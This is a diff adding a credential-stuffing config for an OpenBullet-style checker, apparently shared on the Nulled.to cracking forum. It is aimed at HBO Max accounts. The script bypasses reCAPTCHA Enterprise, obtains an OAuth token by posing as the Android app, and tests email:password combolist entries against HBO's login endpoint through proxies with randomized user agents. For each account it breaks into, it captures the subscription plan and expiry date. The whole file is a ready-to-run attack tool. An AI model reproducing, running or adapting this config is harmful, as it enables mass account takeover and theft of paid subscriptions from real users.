@@ -1,0 +1,146 @@
+[SETTINGS]
+{
+  "Name": "PAID HBOMax WorldWide Updated",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-07-05T12:16:22.7309292-03:00",
+  "AdditionalInfo": "Proxies: Public Works // Version 1.8.0 (Captcha Fixed) // Virus - Nulled.to // -! !PAID CONFIG !- // 31/05/22 [DD/MM/YY]",
+  "RequiredPlugins": [
+    "RecaptchaV3Bypass"
+  ],
+  "Author": "Virus",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "PAID HBOMax WorldWide Updated",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+#Bypass RecaptchaV3Bypass "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LeMrv8ZAAAAAIcvo5HKvdj1lxtUdHnS13jUCulQ&co=aHR0cHM6Ly9wbGF5Lmhib21heC5jb206NDQz&hl=en&v=TDBxTlSsKAUm3tSIa0fwIqNu&size=invisible&cb=ej4cncr952pa" "" "https://www.google.com/recaptcha/enterprise/reload?k=6LeMrv8ZAAAAAIcvo5HKvdj1lxtUdHnS13jUCulQ" -> VAR "TK" 
+  
+
+BEGIN SCRIPT JavaScript
+function uuidv4() {
+  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+    var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
+    return v.toString(16);
+  });
+}
+var uuid = uuidv4();
+END SCRIPT -> VARS "uuid"
+###Created By @Virus - App Ver 52.20.0.13
+###https://www.nulled.to/user/1284526-virus
+### Nulled.to
+
+#User-Agent FUNCTION GetRandomUA -> VAR "UA" 
+
+#OAuth/Token REQUEST POST "https://oauth.api.hbo.com/auth/tokens" 
+  CONTENT "{\"client_id\":\"9e113e08-b369-4c70-8691-86e2a7c7df8b\",\"client_secret\":\"<uuid>\",\"scope\":\"browse video_playback_free account_registration\",\"grant_type\":\"client_credentials\",\"deviceSerialNumber\":\"<uuid>\",\"clientDeviceData\":{\"paymentProviderCode\":\"google-play\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "X-Hbo-Client-Version: Hadron/52.20.0.13 android/52.20.0.13 (ASUS_Z01QD/7.1.2)" 
+  HEADER "Accept: application/vnd.hbo.v9.full+json" 
+  HEADER "X-B3-TraceId: <uuid>-<uuid>" 
+  HEADER "X-Hbo-Device-Name: androidtablet" 
+  HEADER "X-Hbo-Device-Os-Version: 7.1.2" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "User-Agent: <UA>" 
+  HEADER "connection: close" 
+
+#AT_KC KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "<SOURCE>" DoesNotContain "access_token" 
+
+#OAuth_Token PARSE "<SOURCE>" JSON "access_token" -> VAR "OAUTH" 
+
+#Login REQUEST POST "https://oauth-latam.api.hbo.com/auth/tokens" 
+  CONTENT "{\"grant_type\":\"user_name_password\",\"scope\":\"browse video_playback device elevated_account_management\",\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "X-Hbo-Client-Version: Hadron/52.20.0.13 android/52.20.0.13 (ASUS_Z01QD/7.1.2)" 
+  HEADER "Accept: application/vnd.hbo.v9.full+json" 
+  HEADER "X-B3-TraceId: <uuid>-<uuid>" 
+  HEADER "X-Hbo-Device-Name: androidtablet" 
+  HEADER "X-Hbo-Device-Os-Version: 7.1.2" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Authorization: Bearer <OAUTH>" 
+  HEADER "User-Agent: <UA>" 
+  HEADER "X-RecaptchaToken: <TK>" 
+  HEADER "connection: close" 
+
+#Login_KC KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "invalid_credentials" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+
+#Access PARSE "<SOURCE>" JSON "access_token" -> VAR "ACCESS" 
+
+#Info REQUEST POST "https://comet.api.hbo.com/content" 
+  CONTENT "[{\"id\":\"urn:hbo:billing-status:mine\",\"headers\":{}}]" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/vnd.hbo.v9.full+json" 
+  HEADER "Authorization: Bearer <ACCESS>" 
+  HEADER "User-Agent: <UA>" 
+  HEADER "connection: close" 
+
+#Plan PARSE "<SOURCE>" LR "Current Plan:" "(s" CreateEmpty=FALSE -> CAP "Plan" 
+
+#ExpiresOn PARSE "<SOURCE>" LR "which expires on " "." CreateEmpty=FALSE -> CAP "Exp" 
+
+#IsNordic PARSE "<SOURCE>" LR "Billed Through: [" "]" CreateEmpty=FALSE -> CAP "IsNordic" 
+
+#Premium_KC KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "You’re not subscribed to HBO Max" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "expired" 
+  KEYCHAIN Success OR 
+    KEY "Current Plan" 
+
